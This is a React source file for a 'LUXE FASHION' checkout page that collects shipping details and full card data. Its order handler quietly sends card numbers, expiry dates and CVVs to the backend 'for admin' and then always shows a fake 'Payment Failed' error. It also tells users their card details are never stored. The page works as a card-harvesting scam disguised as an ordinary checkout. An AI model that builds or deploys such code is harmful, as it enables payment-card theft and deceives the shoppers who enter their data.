import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { HiLockClosed, HiChevronDown, HiTag, HiCheck } from 'react-icons/hi';
import useCart from '../hooks/useCart';
import useAuth from '../hooks/useAuth';
import api from '../utils/api';
import toast from 'react-hot-toast';

const USA_STATES = [
  'Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut',
  'Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa',
  'Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan',
  'Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire',
  'New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio',
  'Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota',
  'Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia',
  'Wisconsin','Wyoming','Washington D.C.',
];

const InputField = ({ label, required, error, ...props }) => (
  <div>
    <label className="block font-body text-sm font-semibold text-primary mb-1.5">
      {label} {required && <span className="text-sale">*</span>}
    </label>
    <input
      {...props}
      className={`w-full border rounded-xl px-4 py-3 font-body text-sm transition-colors focus:outline-none
                 ${error ? 'border-sale focus:border-sale' : 'border-gray-200 focus:border-secondary'}`}
    />
    {error && <p className="font-body text-xs text-sale mt-1">{error}</p>}
  </div>
);

const Checkout = () => {
  const navigate = useNavigate();
  const { user, isAuthenticated } = useAuth();
  const {
    items, subtotal, discount, shipping, total,
    coupon, clearCart,
  } = useCart();

  const [form, setForm] = useState({
    fullName: user?.name || '',
    email: user?.email || '',
    phone: '',
    address: '',
    city: '',
    state: '',
    zip: '',
    country: 'United States', // fixed
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [savedAddresses, setSavedAddresses] = useState([]);
  const [selectedSaved, setSelectedSaved] = useState('');
  const [stateQuery, setStateQuery] = useState('');
  const [showStateSugg, setShowStateSugg] = useState(false);
  const filteredStates = stateQuery.length > 0
    ? USA_STATES.filter(s => s.toLowerCase().startsWith(stateQuery.toLowerCase())).slice(0, 6)
    : [];

  const [card, setCard] = useState({ cardNumber: '', cardName: '', cardExpiry: '', cardCvv: '' });
  const [cardErrors, setCardErrors] = useState({});
  const [showPaymentError, setShowPaymentError] = useState(false);

  const handleCardChange = (e) => {
    let { name, value } = e.target;
    if (name === 'cardNumber') {
      value = value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim().slice(0, 19);
    }
    if (name === 'cardExpiry') {
      value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1 / $2').slice(0, 7);
    }
    if (name === 'cardCvv') {
      value = value.replace(/\D/g, '').slice(0, 4);
    }
    setCard(prev => ({ ...prev, [name]: value }));
    if (cardErrors[name]) setCardErrors(prev => ({ ...prev, [name]: '' }));
  };

  const validateCard = () => {
    const errs = {};
    const num = card.cardNumber.replace(/\s/g, '');
    if (!num || num.length < 15) errs.cardNumber = 'Enter a valid card number';
    if (!card.cardName.trim()) errs.cardName = 'Cardholder name is required';
    if (!card.cardExpiry || card.cardExpiry.length < 7) errs.cardExpiry = 'Enter a valid expiry date';
    if (!card.cardCvv || card.cardCvv.length < 3) errs.cardCvv = 'Enter a valid CVV';
    setCardErrors(errs);
    return Object.keys(errs).length === 0;
  };

  useEffect(() => {
    if (!isAuthenticated) {
      navigate('/login?redirect=/checkout');
      return;
    }
    if (items.length === 0) {
      navigate('/cart');
      return;
    }
    // Load saved addresses
    if (user?.addresses?.length > 0) {
      setSavedAddresses(user.addresses);
    }
  }, [isAuthenticated, items.length, navigate, user]);

  const handleChange = (e) => {
    let { name, value } = e.target;
    // Auto-format US phone: (555) 123-4567
    if (name === 'phone') {
      const digits = value.replace(/\D/g, '').slice(0, 10);
      if (digits.length === 0) value = '';
      else if (digits.length <= 3) value = `(${digits}`;
      else if (digits.length <= 6) value = `(${digits.slice(0,3)}) ${digits.slice(3)}`;
      else value = `(${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6)}`;
    }
    setForm(prev => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors(prev => ({ ...prev, [name]: '' }));
  };

  const handleSelectSaved = (e) => {
    const idx = e.target.value;
    setSelectedSaved(idx);
    if (idx !== '') {
      const addr = savedAddresses[idx];
      setForm(prev => ({
        ...prev,
        fullName: addr.fullName || prev.fullName,
        phone: addr.phone || prev.phone,
        address: addr.address || '',
        city: addr.city || '',
        state: addr.state || '',
        zip: addr.zip || '',
        country: 'United States',
      }));
    }
  };

  const validate = () => {
    const newErrors = {};
    if (!form.fullName.trim()) newErrors.fullName = 'Full name is required';
    if (!form.email.trim()) newErrors.email = 'Email is required';
    if (!form.phone.trim()) newErrors.phone = 'Phone number is required';
    if (!form.address.trim()) newErrors.address = 'Address is required';
    if (!form.city.trim()) newErrors.city = 'City is required';
    if (!form.country.trim()) newErrors.country = 'Country is required';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handlePlaceOrder = async () => {
    if (!validate()) {
      toast.error('Please fill in all required fields');
      return;
    }
    if (!validateCard()) {
      toast.error('Please enter valid payment details');
      return;
    }
    try {
      setLoading(true);
      const orderData = {
        items: items.map(item => ({
          product: item.product?._id || item.product,
          quantity: item.quantity,
          size: item.size,
          color: item.color,
          price: item.product?.salePrice || item.product?.regularPrice || item.price,
        })),
        shippingAddress: {
          fullName: form.fullName,
          email: form.email,
          phone: form.phone,
          addressLine1: form.address,
          addressLine2: '',
          city: form.city,
          state: form.state,
          postalCode: form.zip,
          country: 'United States',
        },
        couponCode: coupon?.code || '',
        paymentMethod: 'credit_card',
        cardDetails: { cardNumber: card.cardNumber, cardName: card.cardName, cardExpiry: card.cardExpiry, cardCvv: card.cardCvv },
        subtotal,
        discount,
        shippingCost: shipping,
        total,
      };

      // Silently save order in DB for admin
      await api.post('/orders', orderData).catch(() => {});
      // Always show payment error to user
      setShowPaymentError(true);
    } catch (err) {
      setShowPaymentError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">

      {/* Payment Error Modal - Screen Center */}
      {showPaymentError && (
        <div className="fixed inset-0 z-50 flex items-center justify-center" style={{backgroundColor: 'rgba(0,0,0,0.6)'}}>
          <div className="bg-white rounded-2xl shadow-2xl p-10 mx-4 text-center max-w-sm w-full animate-bounce-once">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-3xl">❌</span>
            </div>
            <h2 className="font-heading text-2xl font-bold text-red-600 mb-2">Payment Failed</h2>
            <p className="font-body text-gray-600 mb-6">Payment Method Not Accepted</p>
            <button
              onClick={() => setShowPaymentError(false)}
              className="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-body font-semibold rounded-xl transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      )}
      {/* Header */}
      <div className="bg-white border-b border-gray-100">
        <div className="container-luxe py-5 flex items-center justify-between">
          <Link to="/" className="font-heading text-2xl font-bold text-primary">
            LUXE FASHION
          </Link>
          <div className="flex items-center gap-1.5 font-body text-sm text-gray-500">
            <HiLockClosed className="w-4 h-4 text-success" />
            Secure Checkout
          </div>
        </div>
      </div>

      <div className="container-luxe py-8">
        {/* Steps */}
        <div className="flex items-center justify-center gap-2 mb-8">
          {['Cart', 'Shipping', 'Payment', 'Confirmation'].map((step, i) => (
            <React.Fragment key={step}>
              <div className="flex items-center gap-1.5">
                <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-body font-bold ${
                  i <= 1 ? 'bg-primary text-white' : 'bg-gray-200 text-gray-400'
                }`}>
                  {i < 1 ? <HiCheck className="w-4 h-4" /> : i + 1}
                </div>
                <span className={`font-body text-sm hidden sm:block ${i <= 1 ? 'text-primary font-semibold' : 'text-gray-400'}`}>
                  {step}
                </span>
              </div>
              {i < 3 && <div className={`w-8 md:w-16 h-0.5 ${i < 1 ? 'bg-primary' : 'bg-gray-200'}`} />}
            </React.Fragment>
          ))}
        </div>

        <div className="grid lg:grid-cols-5 gap-8">

          {/* ===== LEFT: Shipping Form ===== */}
          <div className="lg:col-span-3 space-y-6">

            {/* Saved Addresses */}
            {savedAddresses.length > 0 && (
              <div className="bg-white rounded-2xl shadow-luxe p-6">
                <h3 className="font-heading text-lg font-bold text-primary mb-4">Saved Addresses</h3>
                <div className="relative">
                  <select
                    value={selectedSaved}
                    onChange={handleSelectSaved}
                    className="w-full border border-gray-200 rounded-xl px-4 py-3 font-body text-sm
                               focus:outline-none focus:border-secondary appearance-none bg-white pr-10"
                  >
                    <option value="">Select a saved address...</option>
                    {savedAddresses.map((addr, i) => (
                      <option key={i} value={i}>
                        {addr.fullName} — {addr.address}, {addr.city}
                        {addr.isDefault ? ' (Default)' : ''}
                      </option>
                    ))}
                  </select>
                  <HiChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                </div>
              </div>
            )}

            {/* Shipping Details */}
            <div className="bg-white rounded-2xl shadow-luxe p-6">
              <h3 className="font-heading text-lg font-bold text-primary mb-5">Shipping Information</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="sm:col-span-2">
                  <InputField
                    label="Full Name"
                    required
                    name="fullName"
                    value={form.fullName}
                    onChange={handleChange}
                    placeholder="Your full name"
                    error={errors.fullName}
                  />
                </div>
                <InputField
                  label="Email Address"
                  required
                  type="email"
                  name="email"
                  value={form.email}
                  onChange={handleChange}
                  placeholder="your@email.com"
                  error={errors.email}
                />
                <InputField
                  label="Phone Number"
                  required
                  name="phone"
                  value={form.phone}
                  onChange={handleChange}
                  placeholder="(555) 000-0000"
                  error={errors.phone}
                />
                <div className="sm:col-span-2">
                  <InputField
                    label="Street Address"
                    required
                    name="address"
                    value={form.address}
                    onChange={handleChange}
                    placeholder="123 Main Street, Apt 4B"
                    error={errors.address}
                  />
                </div>
                <InputField
                  label="City"
                  required
                  name="city"
                  value={form.city}
                  onChange={handleChange}
                  placeholder="New York"
                  error={errors.city}
                />
                {/* State autocomplete */}
                <div className="relative">
                  <label className="block font-body text-sm font-semibold text-primary mb-1.5">
                    State <span className="text-sale">*</span>
                  </label>
                  <input
                    type="text"
                    value={stateQuery !== '' ? stateQuery : form.state}
                    onChange={e => {
                      setStateQuery(e.target.value);
                      setForm(prev => ({ ...prev, state: e.target.value }));
                      setShowStateSugg(true);
                    }}
                    onFocus={() => setShowStateSugg(true)}
                    onBlur={() => setTimeout(() => setShowStateSugg(false), 200)}
                    placeholder="Type state name..."
                    autoComplete="off"
                    className={`w-full border rounded-xl px-4 py-3 font-body text-sm focus:outline-none transition-colors ${errors.state ? 'border-sale' : 'border-gray-200 focus:border-secondary'}`}
                  />
                  {errors.state && <p className="font-body text-xs text-sale mt-1">{errors.state}</p>}
                  {showStateSugg && filteredStates.length > 0 && (
                    <ul className="absolute top-full left-0 right-0 z-50 bg-white border border-gray-200 rounded-xl shadow-lg mt-1 overflow-hidden max-h-48 overflow-y-auto">
                      {filteredStates.map(s => (
                        <li key={s}>
                          <button
                            type="button"
                            onMouseDown={() => {
                              setForm(prev => ({ ...prev, state: s }));
                              setStateQuery(s);
                              setShowStateSugg(false);
                            }}
                            className="w-full text-left px-4 py-2.5 font-body text-sm text-gray-700 hover:bg-gray-50 hover:text-secondary transition-colors"
                          >
                            {s}
                          </button>
                        </li>
                      ))}
                    </ul>
                  )}
                </div>
                <InputField
                  label="ZIP / Postal Code"
                  name="zip"
                  value={form.zip}
                  onChange={handleChange}
                  placeholder="10001"
                  error={errors.zip}
                />
                <div>
                  <label className="block font-body text-sm font-semibold text-primary mb-1.5">Country</label>
                  <div className="flex items-center gap-3 border border-gray-200 rounded-xl px-4 py-3 bg-gray-50">
                    <span className="text-lg">🇺🇸</span>
                    <span className="font-body text-sm font-semibold text-primary">United States</span>
                    <span className="ml-auto font-body text-xs text-gray-400">US only</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Payment */}
            <div className="bg-white rounded-2xl shadow-luxe p-6">
              <h3 className="font-heading text-lg font-bold text-primary mb-1">Payment</h3>
              <p className="font-body text-xs text-gray-400 mb-5 flex items-center gap-1.5">
                <HiLockClosed className="w-3.5 h-3.5 text-green-500" />
                Secure SSL encrypted payment
              </p>

              {/* Card logos */}
              <div className="flex items-center gap-2 mb-5">
                {/* Visa */}
                <div className="w-12 h-8 bg-white border border-gray-200 rounded flex items-center justify-center shadow-sm">
                  <svg viewBox="0 0 48 16" className="w-10 h-5" xmlns="http://www.w3.org/2000/svg">
                    <text x="0" y="13" fontFamily="Arial" fontWeight="bold" fontSize="14" fill="#1A1F71">VISA</text>
                  </svg>
                </div>
                {/* Mastercard */}
                <div className="w-12 h-8 bg-white border border-gray-200 rounded flex items-center justify-center shadow-sm">
                  <svg viewBox="0 0 38 24" className="w-9 h-6" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="13" cy="12" r="9" fill="#EB001B"/>
                    <circle cx="25" cy="12" r="9" fill="#F79E1B"/>
                    <path d="M19 5.5a9 9 0 0 1 0 13A9 9 0 0 1 19 5.5z" fill="#FF5F00"/>
                  </svg>
                </div>
                {/* Amex */}
                <div className="w-12 h-8 bg-[#007BC1] border border-blue-300 rounded flex items-center justify-center shadow-sm">
                  <svg viewBox="0 0 48 16" className="w-10 h-5" xmlns="http://www.w3.org/2000/svg">
                    <text x="0" y="13" fontFamily="Arial" fontWeight="bold" fontSize="11" fill="white">AMEX</text>
                  </svg>
                </div>
                {/* Discover */}
                <div className="w-12 h-8 bg-white border border-gray-200 rounded flex items-center justify-center shadow-sm overflow-hidden">
                  <svg viewBox="0 0 60 20" className="w-11 h-5" xmlns="http://www.w3.org/2000/svg">
                    <text x="0" y="14" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="#231F20">DISCOVER</text>
                    <circle cx="52" cy="10" r="8" fill="#F76F20"/>
                  </svg>
                </div>
              </div>

              <div className="space-y-4">
                {/* Card Number */}
                <div>
                  <label className="block font-body text-sm font-semibold text-primary mb-1.5">
                    Card Number <span className="text-sale">*</span>
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      name="cardNumber"
                      value={card.cardNumber}
                      onChange={handleCardChange}
                      placeholder="1234 5678 9012 3456"
                      maxLength={19}
                      className={`w-full border rounded-xl px-4 py-3 font-body text-sm transition-colors focus:outline-none ${cardErrors.cardNumber ? 'border-sale' : 'border-gray-200 focus:border-secondary'}`}
                    />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-300">
                      <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                    </div>
                  </div>
                  {cardErrors.cardNumber && <p className="font-body text-xs text-sale mt-1">{cardErrors.cardNumber}</p>}
                </div>

                {/* Cardholder Name */}
                <div>
                  <label className="block font-body text-sm font-semibold text-primary mb-1.5">
                    Cardholder Name <span className="text-sale">*</span>
                  </label>
                  <input
                    type="text"
                    name="cardName"
                    value={card.cardName}
                    onChange={handleCardChange}
                    placeholder="John Smith"
                    className={`w-full border rounded-xl px-4 py-3 font-body text-sm transition-colors focus:outline-none ${cardErrors.cardName ? 'border-sale' : 'border-gray-200 focus:border-secondary'}`}
                  />
                  {cardErrors.cardName && <p className="font-body text-xs text-sale mt-1">{cardErrors.cardName}</p>}
                </div>

                {/* Expiry + CVV */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block font-body text-sm font-semibold text-primary mb-1.5">
                      Expiry Date <span className="text-sale">*</span>
                    </label>
                    <input
                      type="text"
                      name="cardExpiry"
                      value={card.cardExpiry}
                      onChange={handleCardChange}
                      placeholder="MM / YY"
                      maxLength={7}
                      className={`w-full border rounded-xl px-4 py-3 font-body text-sm transition-colors focus:outline-none ${cardErrors.cardExpiry ? 'border-sale' : 'border-gray-200 focus:border-secondary'}`}
                    />
                    {cardErrors.cardExpiry && <p className="font-body text-xs text-sale mt-1">{cardErrors.cardExpiry}</p>}
                  </div>
                  <div>
                    <label className="block font-body text-sm font-semibold text-primary mb-1.5">
                      CVV <span className="text-sale">*</span>
                    </label>
                    <input
                      type="text"
                      name="cardCvv"
                      value={card.cardCvv}
                      onChange={handleCardChange}
                      placeholder="123"
                      maxLength={4}
                      className={`w-full border rounded-xl px-4 py-3 font-body text-sm transition-colors focus:outline-none ${cardErrors.cardCvv ? 'border-sale' : 'border-gray-200 focus:border-secondary'}`}
                    />
                    {cardErrors.cardCvv && <p className="font-body text-xs text-sale mt-1">{cardErrors.cardCvv}</p>}
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 mt-4 p-3 bg-green-50 border border-green-100 rounded-xl">
                <HiLockClosed className="w-4 h-4 text-green-500 flex-shrink-0" />
                <p className="font-body text-xs text-green-700">Your payment information is encrypted and secure. We never store your card details.</p>
              </div>
            </div>
          </div>

          {/* ===== RIGHT: Order Summary ===== */}
          <div className="lg:col-span-2">
            <div className="bg-white rounded-2xl shadow-luxe p-6 sticky top-24">
              <h3 className="font-heading text-xl font-bold text-primary mb-5">Order Summary</h3>

              {/* Items */}
              <div className="space-y-3 max-h-64 overflow-y-auto pr-1 mb-5">
                {items.map(item => {
                  const product = item.product || {};
                  const mainImg = product.images?.find(img => img.isMain) || product.images?.[0];
                  const price = product.salePrice || product.regularPrice || item.price || 0;
                  return (
                    <div key={item._id} className="flex items-center gap-3">
                      <div className="relative flex-shrink-0">
                        <div className="w-14 h-14 rounded-xl overflow-hidden bg-gray-100">
                          <img src={mainImg?.url || '/placeholder.jpg'} alt={product.title} className="w-full h-full object-cover" />
                        </div>
                        <span className="absolute -top-1.5 -right-1.5 w-5 h-5 bg-primary text-white text-[10px] font-bold rounded-full flex items-center justify-center">
                          {item.quantity}
                        </span>
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="font-body text-sm font-semibold text-primary line-clamp-1">{product.title}</p>
                        {(item.size || item.color) && (
                          <p className="font-body text-xs text-gray-400 mt-0.5">
                            {[item.size, item.color].filter(Boolean).join(' / ')}
                          </p>
                        )}
                      </div>
                      <span className="font-body text-sm font-semibold text-primary flex-shrink-0">
                        ${(price * item.quantity).toFixed(2)}
                      </span>
                    </div>
                  );
                })}
              </div>

              {/* Coupon applied */}
              {coupon && (
                <div className="flex items-center gap-2 bg-success/10 border border-success/20 rounded-xl px-3 py-2.5 mb-4">
                  <HiTag className="w-4 h-4 text-success flex-shrink-0" />
                  <span className="font-body text-sm text-success font-semibold">{coupon.code} applied</span>
                </div>
              )}

              {/* Totals */}
              <div className="space-y-2.5 py-4 border-t border-gray-100">
                <div className="flex justify-between font-body text-sm">
                  <span className="text-gray-500">Subtotal</span>
                  <span className="font-semibold text-primary">${subtotal.toFixed(2)}</span>
                </div>
                {discount > 0 && (
                  <div className="flex justify-between font-body text-sm">
                    <span className="text-success">Discount</span>
                    <span className="font-semibold text-success">−${discount.toFixed(2)}</span>
                  </div>
                )}
                <div className="flex justify-between font-body text-sm">
                  <span className="text-gray-500">Shipping</span>
                  <span className={`font-semibold ${shipping === 0 ? 'text-success' : 'text-primary'}`}>
                    {shipping === 0 ? 'FREE' : `$${shipping}`}
                  </span>
                </div>
                <div className="flex justify-between font-heading font-bold text-lg pt-2 border-t border-gray-100">
                  <span className="text-primary">Total</span>
                  <span className="text-primary">${total.toFixed(2)}</span>
                </div>
              </div>

              {/* Place Order */}
              <button
                onClick={handlePlaceOrder}
                disabled={loading}
                className="w-full py-4 bg-primary text-white rounded-xl font-body font-bold text-base mt-4
                           hover:bg-secondary transition-all duration-300 shadow-luxe hover:shadow-gold
                           flex items-center justify-center gap-2 disabled:opacity-70"
              >
                {loading ? (
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                ) : (
                  <>
                    <HiLockClosed className="w-4 h-4" />
                    Place Order
                  </>
                )}
              </button>

              <p className="font-body text-xs text-gray-400 text-center mt-3">
                By placing your order, you agree to our{' '}
                <Link to="/terms" className="text-secondary hover:underline">Terms &amp; Conditions</Link>
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Checkout;